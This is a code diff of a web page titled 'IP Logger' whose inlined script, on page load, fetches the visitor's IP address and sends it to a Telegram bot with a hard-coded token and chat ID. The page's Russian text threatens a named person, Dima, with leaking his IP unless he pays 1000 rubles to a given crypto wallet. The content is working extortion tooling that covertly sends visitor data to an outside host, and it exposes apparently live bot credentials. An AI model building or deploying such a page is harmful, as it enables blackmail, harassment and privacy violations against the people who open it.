@@ -9,13 +9,57 @@
   <meta property="og:type" content="website">
 
   <title>IP Logger</title>
-  <link rel="stylesheet" type="text/css" href="https://raw.githubusercontent.com/UserForBruteer/drive.google.github.com/main/Style.css">
+    <style>body {
+  font-family: Arial, sans-serif;
+  text-align: center;
+}
+
+h1 {
+  color: #333;
+}
+
+p {
+  color: #666;
+} </style>
 </head>
 <body>
   <h1>IP Logger</h1>
   <p id="ipAddress">Ну привет Дима! Я знаю твой айпи, он уже есть у меня в тг, не хочешь чтобы его я слил в сеть? кидай 1000 рублей на этот кошельёк:0x082ef97035B4d4Bf87be57eFE5b603D70abCAA07(метамаск), твой айпи: </p>
 
   <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-  <script src="https://raw.githubusercontent.com/UserForBruteer/drive.google.github.com/main/Script.js"></script>
+  <script>// Функция для отправки IP-адреса в Telegram
+function sendIpToTelegram(ipAddress) {
+  const token = '6050243352:AAEM94YOt5UNWOCSMTNGL8Fn5rxKubas-1I'; // Замени на свой токен
+  const chatId = '5263244915'; // Замени на свой chat ID
+
+  const message = `IP-адрес: ${ipAddress}`;
+
+  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;
+
+  axios.get(url)
+    .then(response => {
+      console.log('IP-адрес успешно отправлен в Telegram');
+    })
+    .catch(error => {
+      console.log('Ошибка при отправке IP-адреса в Telegram', error);
+    });
+}
+
+// Функция для получения IP-адреса пользователя
+function getIpAddress() {
+  fetch("https://api.ipify.org/?format=json")
+    .then(response => response.json())
+    .then(data => {
+      const ipAddress = data.ip;
+      const ipAddressElement = document.getElementById("ipAddress");
+      ipAddressElement.textContent += ipAddress;
+
+      sendIpToTelegram(ipAddress); // Отправка IP-адреса в Telegram
+    })
+    .catch(error => console.log(error));
+}
+
+// Вызов функции при загрузке страницы
+getIpAddress();</script>
 </body>
 </html>
